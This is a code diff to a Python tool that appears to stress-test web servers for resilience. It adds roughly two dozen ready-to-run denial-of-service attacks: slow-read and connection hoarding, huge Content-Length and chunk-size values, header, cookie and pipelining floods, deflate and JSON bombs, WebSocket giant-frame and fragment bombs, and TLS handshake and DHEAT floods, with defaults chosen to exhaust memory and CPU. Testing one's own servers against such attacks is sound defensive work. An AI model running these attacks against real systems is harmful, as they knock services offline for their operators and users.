@@ -33,7 +33,9 @@ flat server memory = the server defended itself; growing memory / OOM = it did
 not.
 """
 import argparse
+import base64
 import json
+import os
 import socket
 import ssl
 import sys
@@ -183,7 +185,7 @@ def _hpack_filler(size):
         val = b"a" * 32
         out += b"\x00" + bytes([len(name)]) + name + bytes([len(val)]) + val
         k += 1
-    return bytes(out)
+    return bytes(out[:size])   # exact: a CONTINUATION frame must stay <= SETTINGS_MAX_FRAME_SIZE (16384)
 
 
 def _h2_get_block(authority):
@@ -219,10 +221,12 @@ def _h2_session(args, stats, lock, body, deadline):
     """Open one H2(c) connection, send the preface + an empty SETTINGS, then run
     body(s, deadline) -> (frames, nbytes) until it returns or the peer drops us."""
     s = None
+    established = False
     try:
         s = _open(args.host, args.port, args.tls, ["h2"] if args.tls else None)
         s.sendall(H2_PREFACE)
         s.sendall(_frame(0x4, 0, 0, b""))               # empty SETTINGS
+        established = True
         with lock:
             stats["established"] += 1
         frames, nbytes = body(s, deadline)
@@ -230,8 +234,11 @@ def _h2_session(args, stats, lock, body, deadline):
             stats["frames_sent"] += frames
             stats["bytes_sent"] += nbytes
     except OSError:
+        # A drop before the preface/SETTINGS land is a connect failure (e.g. an
+        # unbound port), not a server reap — keep them apart so a mis-routed
+        # attack can't read as "defended".
         with lock:
-            stats["reaped"] += 1
+            stats["reaped" if established else "connect_errors"] += 1
     finally:
         if s is not None:
             try:
@@ -403,11 +410,42 @@ def _gzip_bomb(size):
     return bytes(out)
 
 
-def _h1_request_flood(args, req):
+def _no_endpoint():
+    return dict(endpoint_missing=True, established=0, reaped=0, connect_errors=0,
+                frames_sent=0, bytes_sent=0)
+
+
+def _endpoint_present(args, path):
+    """Probe `path` with a tiny POST; False if the entry answers 404/405/501 (it
+    doesn't implement the endpoint) so the attack can report "no-endpoint" rather
+    than a meaningless "survived". Any other status (or an unreadable probe) is
+    treated as present — the attack then runs and the server-side signal decides."""
+    try:
+        s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
+        s.settimeout(5)
+        body = b"a=1"
+        s.sendall((f"POST {path} HTTP/1.1\r\nHost: {args.host}\r\n"
+                   f"Content-Type: application/x-www-form-urlencoded\r\n"
+                   f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body)
+        head = s.recv(64)
+        try:
+            s.close()
+        except OSError:
+            pass
+        parts = head.split(b" ")
+        code = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
+        return code not in (404, 405, 501)
+    except OSError:
+        return True
+
+
+def _h1_request_flood(args, req, require_endpoint=None):
     """N connections each send one fixed HTTP/1.1 request repeatedly until the
     deadline. The shared engine behind every payload/parser attack; `frames_sent`
-    counts requests. These are differential: a request only bites a server that
-    actually parses the body/headers it targets."""
+    counts requests. The parser attacks pass `require_endpoint` so a target without
+    that endpoint reports "no-endpoint" instead of a meaningless "survived"."""
+    if require_endpoint is not None and not _endpoint_present(args, require_endpoint):
+        return _no_endpoint()
     deadline = time.monotonic() + args.duration
     stats = _new_stats()
     lock = threading.Lock()
@@ -433,7 +471,10 @@ def _h1_request_flood(args, req):
                 if established:
                     stats["established"] += 1
                 if reaped:
-                    stats["reaped"] += 1
+                    # A failure after the connection was established is a server
+                    # reap; one before (the _open itself) is a connect failure —
+                    # don't let an unbound port / dead server read as "defended".
+                    stats["reaped" if established else "connect_errors"] += 1
                 stats["frames_sent"] += sent
                 stats["bytes_sent"] += nb
             if s is not None:
@@ -454,7 +495,7 @@ def decompression_bomb(args):
     req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
             f"Content-Encoding: gzip\r\nContent-Type: application/octet-stream\r\n"
             f"Content-Length: {len(bomb)}\r\n\r\n").encode() + bomb)
-    return _h1_request_flood(args, req)
+    return _h1_request_flood(args, req, require_endpoint=args.path)
 
 
 def hashdos(args):
@@ -464,7 +505,7 @@ def hashdos(args):
     req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
             f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
-    return _h1_request_flood(args, req)
+    return _h1_request_flood(args, req, require_endpoint=args.path)
 
 
 def json_nesting_bomb(args):
@@ -474,7 +515,7 @@ def json_nesting_bomb(args):
     req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
             f"Content-Type: application/json\r\n"
             f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
-    return _h1_request_flood(args, req)
+    return _h1_request_flood(args, req, require_endpoint=args.path)
 
 
 def multipart_flood(args):
@@ -487,7 +528,7 @@ def multipart_flood(args):
     req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n").encode()
            + b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
            + f"Content-Length: {len(body)}\r\n\r\n".encode() + body)
-    return _h1_request_flood(args, req)
+    return _h1_request_flood(args, req, require_endpoint=args.path)
 
 
 def redos_headers(args):
@@ -501,6 +542,622 @@ def redos_headers(args):
            + b"Range: bytes=" + b",".join(b"0-0" for _ in range(max(1, args.redos_pad // 4))) + b"\r\n"
            + b"Connection: keep-alive\r\n\r\n")
     return _h1_request_flood(args, req)
+
+
+# ── HTTP/1.1 connection-hold engine (hold complete/partial requests idle) ─────
+
+def _h1_hold(args, opener):
+    """Open N connections, send `opener` on each, then hold them idle until the
+    deadline — draining non-blocking to notice if the server reaps them. Backs the
+    attacks whose pressure is "a request that is complete-but-waiting or reserving
+    resources", where re-sending on the same socket would corrupt the stream."""
+    deadline = time.monotonic() + args.duration
+    conns = []
+    established = errors = 0
+    for _ in range(args.conns):
+        if time.monotonic() > deadline:
+            break
+        try:
+            s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
+            s.sendall(opener)
+            s.setblocking(False)
+            conns.append(s)
+            established += 1
+        except OSError:
+            errors += 1
+    reaped = 0
+    while time.monotonic() < deadline and conns:
+        for s in list(conns):
+            try:
+                if s.recv(65536) == b"":
+                    reaped += 1
+                    conns.remove(s)
+                    s.close()
+            except (BlockingIOError, ssl.SSLWantReadError, ssl.SSLWantWriteError):
+                pass
+            except OSError:
+                reaped += 1
+                conns.remove(s)
+                try:
+                    s.close()
+                except OSError:
+                    pass
+        time.sleep(1.0)
+    open_at_end = len(conns)
+    for s in conns:
+        try:
+            s.close()
+        except OSError:
+            pass
+    return dict(established=established, reaped=reaped, open_at_end=open_at_end,
+                drip_sent_bytes=0, connect_errors=errors)
+
+
+def keepalive_hoard(args):
+    # N complete keep-alive requests, then idle: max-conn + idle-timeout test.
+    return _h1_hold(args, (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+                           f"Connection: keep-alive\r\n\r\n").encode())
+
+
+def content_length_preallocation(args):
+    # Declare a huge Content-Length and send NO body: a server that sizes its read
+    # buffer from the declared length pre-allocates gigabytes per connection.
+    return _h1_hold(args, (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+                           f"Content-Type: application/octet-stream\r\n"
+                           f"Content-Length: {args.cl_declare}\r\n\r\n").encode())
+
+
+def expect_100_continue_hold(args):
+    # Expect: 100-continue + a large Content-Length, then withhold the body: the
+    # server emits 100 Continue and/or reserves a body buffer it never fills.
+    return _h1_hold(args, (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+                           f"Content-Type: application/octet-stream\r\n"
+                           f"Content-Length: {args.cl_declare}\r\n"
+                           f"Expect: 100-continue\r\n\r\n").encode())
+
+
+def chunk_size_overflow(args):
+    # A chunk-size near 2**64: parsers that compute size+2 (for the CRLF) or
+    # accumulate without overflow checks wrap to a huge/negative size and crash.
+    return _h1_hold(args, (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+                           f"Transfer-Encoding: chunked\r\n\r\nfffffffffffffffe\r\n").encode())
+
+
+def slow_read(args):
+    # Request a large response, then read it ~1 byte per interval: the server
+    # buffers the response (or blocks the connection) it cannot flush to us.
+    # /static/vendor.js is ~300 KiB — far past the socket send buffer, so the
+    # response genuinely stalls (unlike /json, which clamps to the 50-item dataset).
+    req = (f"GET /static/vendor.js HTTP/1.1\r\nHost: {args.host}\r\n\r\n").encode()
+    deadline = time.monotonic() + args.duration
+    conns = []
+    established = errors = 0
+    for _ in range(args.conns):
+        if time.monotonic() > deadline:
+            break
+        try:
+            s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
+            s.sendall(req)
+            s.setblocking(False)
+            conns.append(s)
+            established += 1
+        except OSError:
+            errors += 1
+    reaped = read = 0
+    while time.monotonic() < deadline and conns:
+        for s in list(conns):
+            try:
+                b = s.recv(1)
+                if b == b"":
+                    reaped += 1
+                    conns.remove(s)
+                    s.close()
+                else:
+                    read += len(b)
+            except (BlockingIOError, ssl.SSLWantReadError, ssl.SSLWantWriteError):
+                pass
+            except OSError:
+                reaped += 1
+                conns.remove(s)
+                try:
+                    s.close()
+                except OSError:
+                    pass
+        time.sleep(args.drip_interval)
+    open_at_end = len(conns)
+    for s in conns:
+        try:
+            s.close()
+        except OSError:
+            pass
+    return dict(established=established, reaped=reaped, open_at_end=open_at_end,
+                drip_sent_bytes=read, connect_errors=errors)
+
+
+def trailer_flood(args):
+    # Chunked body terminated by 0\r\n, then an unbounded trailer section never
+    # closed: limits guard the leading header block, rarely the trailers.
+    opener = lambda i: (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+                        f"Transfer-Encoding: chunked\r\n\r\n0\r\n").encode()
+    dripper = lambda i, d: (f"X-Trailer-{i}-{d}: a\r\n").encode()
+    return _run_slow(args, opener, dripper)
+
+
+def chunk_extension_flood(args):
+    # Each 1-byte chunk carries a huge chunk-extension the server must scan and
+    # discard: far more bytes read than body delivered (CVE-2023-39326).
+    ext = "a" * args.chunk_ext_size
+    opener = lambda i: (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+                        f"Transfer-Encoding: chunked\r\n\r\n").encode()
+    dripper = lambda i, d: (f"1;{ext}\r\nA\r\n").encode()
+    return _run_slow(args, opener, dripper)
+
+
+def tiny_chunk_flood(args):
+    # A chunked body of very many 1-byte chunks: per-chunk framing/dechunk overhead.
+    body = b"1\r\nA\r\n" * args.chunk_count + b"0\r\n\r\n"
+    req = (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+           f"Transfer-Encoding: chunked\r\n\r\n").encode() + body
+    return _h1_request_flood(args, req)
+
+
+def large_upload(args):
+    # A huge, uncompressed body delivered FAST (not dripped): tests whole-body
+    # buffering + max-body-size with real volume, where slow-body delivers ~nothing.
+    headers = (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+               f"Content-Type: application/octet-stream\r\n"
+               f"Content-Length: {args.upload_size}\r\n\r\n").encode()
+    buf = b"A" * (1 << 20)
+    deadline = time.monotonic() + args.duration
+    stats = _new_stats()
+    lock = threading.Lock()
+
+    def worker():
+        sent = nb = 0
+        s = None
+        established = reaped = False
+        try:
+            s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
+            s.settimeout(10)
+            established = True
+            while time.monotonic() < deadline:
+                try:
+                    s.sendall(headers)
+                    remaining = args.upload_size
+                    while remaining > 0 and time.monotonic() < deadline:
+                        n = min(len(buf), remaining)
+                        s.sendall(buf if n == len(buf) else buf[:n])
+                        nb += n
+                        remaining -= n
+                    sent += 1
+                    s.recv(65536)
+                except socket.timeout:
+                    continue
+        except OSError:
+            reaped = True
+        finally:
+            with lock:
+                if established:
+                    stats["established"] += 1
+                if reaped:
+                    # A failure after the connection was established is a server
+                    # reap; one before (the _open itself) is a connect failure —
+                    # don't let an unbound port / dead server read as "defended".
+                    stats["reaped" if established else "connect_errors"] += 1
+                stats["frames_sent"] += sent
+                stats["bytes_sent"] += nb
+            if s is not None:
+                try:
+                    s.close()
+                except OSError:
+                    pass
+
+    _run_workers(args.conns, deadline, worker)
+    return stats
+
+
+def header_bomb(args):
+    # One complete request with a single enormous header VALUE: tests the per-field
+    # / total header size cap at parse time.
+    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
+           + b"X-Pad: " + b"a" * args.header_value_size + b"\r\n\r\n")
+    return _h1_request_flood(args, req)
+
+
+def header_count_flood(args):
+    # Very many tiny distinct header fields, each under any per-field cap: tests the
+    # header COUNT cap (a dimension several stacks left unguarded until 2026).
+    hdrs = b"".join(b"X-%x: a\r\n" % i for i in range(args.header_count))
+    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode() + hdrs + b"\r\n")
+    return _h1_request_flood(args, req)
+
+
+def duplicate_header_merge(args):
+    # The SAME header name repeated N times: frameworks that join duplicates into
+    # one value with repeated concatenation do O(n^2) work before the handler runs.
+    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
+           + b"X-Dup: a\r\n" * args.dup_headers + b"\r\n")
+    return _h1_request_flood(args, req)
+
+
+def pipelining_flood(args):
+    # Thousands of pipelined requests on one keep-alive socket, responses never
+    # read: a server that doesn't bound the inbound queue buffers them all (OOM).
+    batch = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n\r\n").encode() * args.pipeline_depth
+    deadline = time.monotonic() + args.duration
+    stats = _new_stats()
+    lock = threading.Lock()
+
+    def worker():
+        sent = nb = 0
+        s = None
+        established = reaped = False
+        try:
+            s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
+            s.settimeout(5)
+            established = True
+            while time.monotonic() < deadline:
+                try:
+                    s.sendall(batch)
+                    sent += args.pipeline_depth
+                    nb += len(batch)
+                except socket.timeout:
+                    break   # backpressured: the server is holding the queue
+        except OSError:
+            reaped = True
+        finally:
+            with lock:
+                if established:
+                    stats["established"] += 1
+                if reaped:
+                    # A failure after the connection was established is a server
+                    # reap; one before (the _open itself) is a connect failure —
+                    # don't let an unbound port / dead server read as "defended".
+                    stats["reaped" if established else "connect_errors"] += 1
+                stats["frames_sent"] += sent
+                stats["bytes_sent"] += nb
+            if s is not None:
+                try:
+                    s.close()
+                except OSError:
+                    pass
+
+    _run_workers(args.conns, deadline, worker)
+    return stats
+
+
+# ── HTTP/1.1 parser-differential attacks (bite only servers that parse X) ─────
+
+def decomp_codec_bypass(args):
+    # A deflate (zlib) bomb labelled `Content-Encoding: deflate`: servers that cap
+    # gzip but not deflate, or decode by content-type, inflate unbounded. (br/zstd
+    # would need non-stdlib libraries.)
+    co = zlib.compressobj(6)
+    out = bytearray()
+    chunk = b"\x00" * (1 << 20)
+    remaining = args.bomb_size
+    while remaining > 0:
+        n = min(len(chunk), remaining)
+        out += co.compress(chunk if n == len(chunk) else chunk[:n])
+        remaining -= n
+    bomb = bytes(out + co.flush())
+    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+            f"Content-Encoding: deflate\r\nContent-Type: application/octet-stream\r\n"
+            f"Content-Length: {len(bomb)}\r\n\r\n").encode() + bomb)
+    return _h1_request_flood(args, req, require_endpoint=args.path)
+
+
+def qvalue_cpu_bomb(args):
+    # A huge Accept-Language list: parsers that sort by q-value quadratically spend
+    # the CPU before the request is even dispatched (Jetty CVE-2020-27223).
+    al = b",".join(b"en-%x;q=0.%d" % (i, i % 10) for i in range(args.qvalue_count))
+    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
+           + b"Accept-Language: " + al + b"\r\n\r\n")
+    return _h1_request_flood(args, req)
+
+
+def cookie_flood(args):
+    # One Cookie header of many tiny pairs, under the header-byte cap: parsers with
+    # no cookie-COUNT cap allocate one object per crumb (CVE-2025-58186).
+    cookie = b";".join(b"a%x=1" % i for i in range(args.cookie_pairs))
+    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
+           + b"Cookie: " + cookie + b"\r\n\r\n")
+    return _h1_request_flood(args, req)
+
+
+def percent_decode_quadratic(args):
+    # A request path of many percent-encoded tokens: routers that re-scan the whole
+    # remaining string per token decode it super-linearly (CVE-2026-45822).
+    path = "/" + "%41" * args.percent_count
+    req = (f"GET {path} HTTP/1.1\r\nHost: {args.host}\r\n\r\n").encode()
+    return _h1_request_flood(args, req)
+
+
+def range_bomb(args):
+    # Many overlapping byte ranges on a static file: the server assembles a
+    # multipart/byteranges response far larger than the file (Apache-Killer).
+    rng = b"bytes=" + b",".join(b"0-%d" % i for i in range(args.range_count))
+    req = (f"GET /static/reset.css HTTP/1.1\r\nHost: {args.host}\r\n".encode()
+           + b"Range: " + rng + b"\r\n\r\n")
+    return _h1_request_flood(args, req)
+
+
+def json_bignum(args):
+    # A single gigantic numeric literal: parsers that fall back to arbitrary
+    # precision (BigDecimal / Python int) do quadratic conversion on one token.
+    body = b'{"n":' + b"9" * args.bignum_digits + b"}"
+    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+            f"Content-Type: application/json\r\n"
+            f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
+    return _h1_request_flood(args, req, require_endpoint=args.path)
+
+
+# ── WebSocket attack toolkit ─────────────────────────────────────────────────
+
+def _ws_connect(args, extensions=None):
+    """Open a WebSocket connection to /ws (RFC 6455 handshake). Returns the socket
+    after a 101, raises OSError otherwise."""
+    key = base64.b64encode(os.urandom(16)).decode()
+    req = (f"GET /ws HTTP/1.1\r\nHost: {args.host}\r\nUpgrade: websocket\r\n"
+           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
+           f"Sec-WebSocket-Version: 13\r\n").encode()
+    if extensions:
+        req += b"Sec-WebSocket-Extensions: " + extensions + b"\r\n"
+    req += b"\r\n"
+    s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
+    try:
+        s.sendall(req)
+        s.settimeout(5)
+        resp = b""
+        while b"\r\n\r\n" not in resp and len(resp) < 65536:
+            b = s.recv(4096)
+            if not b:
+                break
+            resp += b
+        if b" 101" not in resp.split(b"\r\n", 1)[0]:
+            raise OSError("ws handshake not 101")
+        s.settimeout(None)
+        return s
+    except OSError:
+        # Close the fd on any handshake failure — the caller's `s` is still None,
+        # so its finally can't; a mass-failure run would otherwise leak fds.
+        try:
+            s.close()
+        except OSError:
+            pass
+        raise
+
+
+def _ws_frame(opcode, payload, fin=True, rsv1=False):
+    """A masked client WebSocket frame (clients MUST mask, RFC 6455 §5.3)."""
+    b0 = (0x80 if fin else 0) | (0x40 if rsv1 else 0) | (opcode & 0x0F)
+    n = len(payload)
+    if n < 126:
+        head = bytes([b0, 0x80 | n])
+    elif n < 65536:
+        head = bytes([b0, 0x80 | 126]) + n.to_bytes(2, "big")
+    else:
+        head = bytes([b0, 0x80 | 127]) + n.to_bytes(8, "big")
+    mask = os.urandom(4)
+    masked = bytes(payload[i] ^ mask[i % 4] for i in range(n))
+    return head + mask + masked
+
+
+def _ws_frame_header(opcode, declared_len, fin=True):
+    """Just a frame header declaring `declared_len` bytes, no payload — for the
+    giant-frame pre-allocation probe."""
+    b0 = (0x80 if fin else 0) | (opcode & 0x0F)
+    if declared_len < 126:
+        head = bytes([b0, 0x80 | declared_len])
+    elif declared_len < 65536:
+        head = bytes([b0, 0x80 | 126]) + declared_len.to_bytes(2, "big")
+    else:
+        head = bytes([b0, 0x80 | 127]) + declared_len.to_bytes(8, "big")
+    return head + os.urandom(4)   # masking key, then (withheld) payload
+
+
+def _ws_flood(args, body):
+    """N WebSocket connections, each running body(s, deadline) -> (frames, nbytes)."""
+    deadline = time.monotonic() + args.duration
+    stats = _new_stats()
+    lock = threading.Lock()
+
+    def worker():
+        s = None
+        established = False
+        try:
+            s = _ws_connect(args)
+            established = True
+            with lock:
+                stats["established"] += 1
+            frames, nbytes = body(s, deadline)
+            with lock:
+                stats["frames_sent"] += frames
+                stats["bytes_sent"] += nbytes
+        except OSError:
+            # Handshake failure (no /ws, upgrade refused) is a connect failure,
+            # not a server reap — keep them apart.
+            with lock:
+                stats["reaped" if established else "connect_errors"] += 1
+        finally:
+            if s is not None:
+                try:
+                    s.close()
+                except OSError:
+                    pass
+
+    _run_workers(args.conns, deadline, worker)
+    return stats
+
+
+def ws_giant_frame(args):
+    # A frame header declaring a near-2**63 payload length, then only a few bytes:
+    # servers that allocate the receive buffer from the declared length OOM at once.
+    def body(s, deadline):
+        s.sendall(_ws_frame_header(0x2, args.ws_frame_len) + b"\x00\x00\x00\x00")
+        s.settimeout(2)
+        while time.monotonic() < deadline:
+            try:
+                if s.recv(4096) == b"":
+                    break
+            except socket.timeout:
+                pass
+        return 1, 0
+    return _ws_flood(args, body)
+
+
+def ws_fragment_bomb(args):
+    # An opening text frame with FIN=0, then endless continuation frames (opcode 0,
+    # FIN=0): servers that aggregate fragments with no total cap buffer forever.
+    frag = _ws_frame(0x0, b"A" * args.ws_frag_size, fin=False)
+
+    def body(s, deadline):
+        f = nb = 0
+        start = _ws_frame(0x1, b"A" * args.ws_frag_size, fin=False)
+        s.sendall(start); f += 1; nb += len(start)
+        while time.monotonic() < deadline:
+            s.sendall(frag); f += 1; nb += len(frag)
+        return f, nb
+    return _ws_flood(args, body)
+
+
+def ws_deflate_bomb(args):
+    # With permessage-deflate negotiated, one compressed frame (RSV1=1) that
+    # inflates to ~GBs: the server inflates before any max-message check.
+    co = zlib.compressobj(9, zlib.DEFLATED, -15)
+    comp = co.compress(b"\x00" * args.bomb_size) + co.flush(zlib.Z_SYNC_FLUSH)
+    if comp.endswith(b"\x00\x00\xff\xff"):
+        comp = comp[:-4]                       # RFC 7692: strip the deflate tail
+    frame = _ws_frame(0x2, comp, fin=True, rsv1=True)
+
+    def body(s, deadline):
+        f = nb = 0
+        while time.monotonic() < deadline:
+            s.sendall(frame); f += 1; nb += len(frame)
+            s.settimeout(3)
+            try:
+                s.recv(65536)
+            except socket.timeout:
+                pass
+        return f, nb
+    return _ws_flood_ext(args, body, b"permessage-deflate")
+
+
+def ws_pong_flood(args):
+    # Flood PING frames while never reading: a server that auto-replies PONG and
+    # ignores write backpressure grows an unbounded outbound queue (CVE-2026-109932).
+    ping = _ws_frame(0x9, b"ping")
+
+    def body(s, deadline):
+        f = nb = 0
+        while time.monotonic() < deadline:
+            s.sendall(ping); f += 1; nb += len(ping)
+        return f, nb
+    return _ws_flood(args, body)
+
+
+def _ws_flood_ext(args, body, ext):
+    """_ws_flood variant that negotiates a WebSocket extension in the handshake."""
+    deadline = time.monotonic() + args.duration
+    stats = _new_stats()
+    lock = threading.Lock()
+
+    def worker():
+        s = None
+        established = False
+        try:
+            s = _ws_connect(args, extensions=ext)
+            established = True
+            with lock:
+                stats["established"] += 1
+            frames, nbytes = body(s, deadline)
+            with lock:
+                stats["frames_sent"] += frames
+                stats["bytes_sent"] += nbytes
+        except OSError:
+            with lock:
+                stats["reaped" if established else "connect_errors"] += 1
+        finally:
+            if s is not None:
+                try:
+                    s.close()
+                except OSError:
+                    pass
+
+    _run_workers(args.conns, deadline, worker)
+    return stats
+
+
+# ── TLS attack toolkit ───────────────────────────────────────────────────────
+
+def _tls_ctx():
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    return ctx
+
+
+def _tls_handshake_loop(args, ctx):
+    """N workers each complete back-to-back TLS handshakes (and immediately drop):
+    the server pays the asymmetric crypto; the client barely does. Returns stats
+    with handshakes in frames_sent and an `immune` flag when the server rejects
+    our offered parameters (e.g. no DHE)."""
+    deadline = time.monotonic() + args.duration
+    stats = _new_stats()
+    lock = threading.Lock()
+
+    def worker():
+        hs = 0
+        failed = False
+        while time.monotonic() < deadline:
+            raw = None
+            try:
+                raw = socket.create_connection((args.host, args.port), timeout=5)
+                ss = ctx.wrap_socket(raw, server_hostname=args.host)
+                hs += 1
+                ss.close()
+            except (ssl.SSLError, OSError):
+                # Either the server rejects our parameters (e.g. no DHE — "immune")
+                # or the port has no TLS listener. Both mean we did NOT load the
+                # server; neither is a "reap". The real signal is frames_sent
+                # (completed handshakes): 0 here = immune / no TLS listener.
+                failed = True
+                if raw is not None:
+                    try:
+                        raw.close()
+                    except OSError:
+                        pass
+                break
+        with lock:
+            if hs:
+                stats["established"] += 1
+            stats["frames_sent"] += hs
+            if failed:
+                stats["connect_errors"] += 1
+    _run_workers(args.conns, deadline, worker)
+    return stats
+
+
+def tls_handshake_flood(args):
+    # Many full TLS handshakes as fast as possible: the server signs / derives per
+    # handshake; 2 vCPUs saturate (THC-SSL-DOS class).
+    return _tls_handshake_loop(args, _tls_ctx())
+
+
+def dheat(args):
+    # Offer only finite-field DHE and flood handshakes: the server must do a full
+    # modular exponentiation each time while the client does ~none (CVE-2002-20001).
+    # If the server offers no DHE, handshakes fail -> reported as immune.
+    ctx = _tls_ctx()
+    try:
+        ctx.maximum_version = ssl.TLSVersion.TLSv1_2
+    except (ValueError, AttributeError):
+        pass
+    try:
+        ctx.set_ciphers("DHE")
+    except ssl.SSLError:
+        pass
+    return _tls_handshake_loop(args, ctx)
 
 
 ATTACKS = {
@@ -520,6 +1177,31 @@ ATTACKS = {
     "json-nesting-bomb": json_nesting_bomb,
     "multipart-flood": multipart_flood,
     "redos-headers": redos_headers,
+    "slow-read": slow_read,
+    "large-upload": large_upload,
+    "keepalive-hoard": keepalive_hoard,
+    "content-length-prealloc": content_length_preallocation,
+    "expect-100-continue": expect_100_continue_hold,
+    "chunk-size-overflow": chunk_size_overflow,
+    "trailer-flood": trailer_flood,
+    "chunk-extension-flood": chunk_extension_flood,
+    "tiny-chunk-flood": tiny_chunk_flood,
+    "header-bomb": header_bomb,
+    "header-count-flood": header_count_flood,
+    "duplicate-header-merge": duplicate_header_merge,
+    "pipelining-flood": pipelining_flood,
+    "decomp-codec-bypass": decomp_codec_bypass,
+    "qvalue-cpu-bomb": qvalue_cpu_bomb,
+    "cookie-flood": cookie_flood,
+    "percent-decode-quadratic": percent_decode_quadratic,
+    "range-bomb": range_bomb,
+    "json-bignum": json_bignum,
+    "ws-giant-frame": ws_giant_frame,
+    "ws-fragment-bomb": ws_fragment_bomb,
+    "ws-deflate-bomb": ws_deflate_bomb,
+    "ws-pong-flood": ws_pong_flood,
+    "tls-handshake-flood": tls_handshake_flood,
+    "dheat": dheat,
 }
 
 
@@ -541,6 +1223,21 @@ def main():
     p.add_argument("--redos-pad", type=int, default=4000, dest="redos_pad")
     p.add_argument("--stall-count", type=int, default=5000, dest="stall_count")
     p.add_argument("--stall-streams", type=int, default=64, dest="stall_streams")
+    p.add_argument("--cl-declare", type=int, default=2 * 1024 * 1024 * 1024, dest="cl_declare")
+    p.add_argument("--chunk-ext-size", type=int, default=4096, dest="chunk_ext_size")
+    p.add_argument("--chunk-count", type=int, default=500000, dest="chunk_count")
+    p.add_argument("--header-value-size", type=int, default=1024 * 1024, dest="header_value_size")
+    p.add_argument("--header-count", type=int, default=50000, dest="header_count")
+    p.add_argument("--dup-headers", type=int, default=20000, dest="dup_headers")
+    p.add_argument("--pipeline-depth", type=int, default=10000, dest="pipeline_depth")
+    p.add_argument("--upload-size", type=int, default=2 * 1024 * 1024 * 1024, dest="upload_size")
+    p.add_argument("--qvalue-count", type=int, default=5000, dest="qvalue_count")
+    p.add_argument("--cookie-pairs", type=int, default=100000, dest="cookie_pairs")
+    p.add_argument("--percent-count", type=int, default=2000, dest="percent_count")
+    p.add_argument("--range-count", type=int, default=1000, dest="range_count")
+    p.add_argument("--bignum-digits", type=int, default=100000, dest="bignum_digits")
+    p.add_argument("--ws-frame-len", type=int, default=(1 << 63) - 256, dest="ws_frame_len")
+    p.add_argument("--ws-frag-size", type=int, default=4096, dest="ws_frag_size")
     p.add_argument("--tls", action="store_true")
     args = p.parse_args()
 
